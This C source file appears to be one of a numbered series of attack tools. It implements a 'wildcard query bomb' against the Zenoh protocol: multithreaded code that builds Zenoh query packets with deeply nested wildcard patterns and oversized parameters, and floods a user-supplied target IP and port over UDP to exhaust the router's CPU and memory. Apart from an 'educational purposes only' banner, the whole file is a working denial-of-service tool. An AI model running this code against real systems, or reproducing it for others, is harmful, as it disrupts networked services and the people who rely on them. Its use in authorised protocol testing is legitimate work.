/*
 * Attack 16: Wildcard Query Bomb
 * Sends queries with expensive wildcard patterns
 * 
 * Compile: gcc -o attack16_queryboomb attack_16_wildcard_query_bomb.c -pthread
 * Run: ./attack16_querybomb <target_ip> <target_port> <threads>
 * 
 * WARNING: FOR EDUCATIONAL PURPOSES ONLY
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <signal.h>
#include <time.h>
#include <stdatomic.h>

#define Z_N_REQUEST 0x09
#define Z_REQUEST_QUERY 0x00

static volatile int g_running = 1;
static atomic_ullong g_queries_sent = 0;

typedef struct {
    char *target_ip;
    int target_port;
    int thread_id;
} thread_args_t;

void signal_handler(int sig) {
    printf("\n[!] Stopping wildcard query bomb...\n");
    g_running = 0;
}

size_t encode_zint(unsigned char *buf, unsigned long long value) {
    size_t i = 0;
    while (value > 0x7F) {
        buf[i++] = (unsigned char)((value & 0x7F) | 0x80);
        value >>= 7;
    }
    buf[i++] = (unsigned char)(value & 0x7F);
    return i;
}

size_t craft_wildcard_query(unsigned char *buffer, unsigned int request_id,
                            const char *pattern, const char *params) {
    size_t offset = 0;
    
    // Network message: REQUEST
    buffer[offset++] = Z_N_REQUEST;
    
    // Request type: QUERY
    buffer[offset++] = Z_REQUEST_QUERY;
    
    // Request ID
    offset += encode_zint(buffer + offset, request_id);
    
    // Key expression (wildcard pattern)
    size_t pattern_len = strlen(pattern);
    offset += encode_zint(buffer + offset, pattern_len);
    memcpy(buffer + offset, pattern, pattern_len);
    offset += pattern_len;
    
    // Parameters
    size_t param_len = strlen(params);
    offset += encode_zint(buffer + offset, param_len);
    memcpy(buffer + offset, params, param_len);
    offset += param_len;
    
    return offset;
}

void* attack_thread(void *arg) {
    thread_args_t *args = (thread_args_t*)arg;
    int sock;
    struct sockaddr_in target_addr;
    unsigned char buffer[2048];
    
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        fprintf(stderr, "[-] Thread %d: Socket failed\n", args->thread_id);
        free(args);
        return NULL;
    }
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->target_port);
    inet_pton(AF_INET, args->target_ip, &target_addr.sin_addr);
    
    printf("[+] Thread %d started (wildcard query bombing)\n", args->thread_id);
    
    // Expensive wildcard patterns
    const char *patterns[] = {
        "**/**/**/**/**",           // Deep recursion
        "*/*/*/*/*/*/*/*/*/*/*/*", // Many wildcards
        "sensor/*/data/**",         // Broad sensor query
        "**/logs/**/**/errors/**",  // Nested wildcards
        "?/?/?/?/?/?/?/?/?/?/?",    // Many single-char wildcards
        "a*/b*/c*/d*/e*/f*/g*/**",  // Prefix wildcards
        "**",                       // Match everything
        "*/*/*/*/*/*/*/*/*/*/data", // Deep path matching
    };
    int num_patterns = 8;
    
    // Expensive parameters
    const char *parameters[] = {
        "?depth=1000&breadth=1000",
        "?recursive=true&limit=999999",
        "?fields=*&expand=*&include=*",
        "?filter=*&sort=*&aggregate=*",
    };
    int num_params = 4;
    
    unsigned int request_id = args->thread_id * 100000;
    unsigned long local_count = 0;
    
    while (g_running) {
        const char *pattern = patterns[rand() % num_patterns];
        const char *params = parameters[rand() % num_params];
        
        size_t msg_len = craft_wildcard_query(buffer, request_id++, 
                                              pattern, params);
        
        ssize_t sent = sendto(sock, buffer, msg_len, 0,
                             (struct sockaddr*)&target_addr,
                             sizeof(target_addr));
        
        if (sent > 0) {
            atomic_fetch_add(&g_queries_sent, 1);
            local_count++;
        }
        
        if (local_count % 100 == 0) {
            printf("[Thread %d] Sent %lu expensive queries\n",
                   args->thread_id, local_count);
        }
        
        usleep(500); // 500μs delay
    }
    
    close(sock);
    printf("[*] Thread %d stopped\n", args->thread_id);
    free(args);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <target_ip> <target_port> <threads>\n", argv[0]);
        return 1;
    }
    
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int num_threads = atoi(argv[3]);
    
    printf("╔════════════════════════════════════════════╗\n");
    printf("║   Zenoh Wildcard Query Bomb Attack         ║\n");
    printf("║   WARNING: EDUCATIONAL PURPOSES ONLY       ║\n");
    printf("╚════════════════════════════════════════════╝\n\n");
    printf("[*] Target: %s:%d\n", target_ip, target_port);
    printf("[*] Threads: %d\n", num_threads);
    printf("[*] Wildcard patterns: 8 expensive variants\n");
    printf("[*] Effect: CPU/memory exhaustion on routing\n\n");
    
    signal(SIGINT, signal_handler);
    srand(time(NULL));
    
    pthread_t threads[num_threads];
    time_t start = time(NULL);
    
    for (int i = 0; i < num_threads; i++) {
        thread_args_t *args = malloc(sizeof(thread_args_t));
        args->target_ip = target_ip;
        args->target_port = target_port;
        args->thread_id = i;
        pthread_create(&threads[i], NULL, attack_thread, args);
    }
    
    printf("[+] Attack started!\n\n");
    
    while (g_running) {
        sleep(5);
        unsigned long long total = atomic_load(&g_queries_sent);
        time_t elapsed = time(NULL) - start;
        printf("[*] Queries sent: %llu | Rate: %.2f qps\n",
               total, elapsed > 0 ? (double)total / elapsed : 0.0);
    }
    
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("\n╔════════════════════════════════════════════╗\n");
    printf("║          Final Statistics                  ║\n");
    printf("╠════════════════════════════════════════════╣\n");
    printf("║ Total Queries: %-27llu ║\n", 
           (unsigned long long)atomic_load(&g_queries_sent));
    printf("║ Duration:      %-27ld ║\n", time(NULL) - start);
    printf("╚════════════════════════════════════════════╝\n");
    
    return 0;
}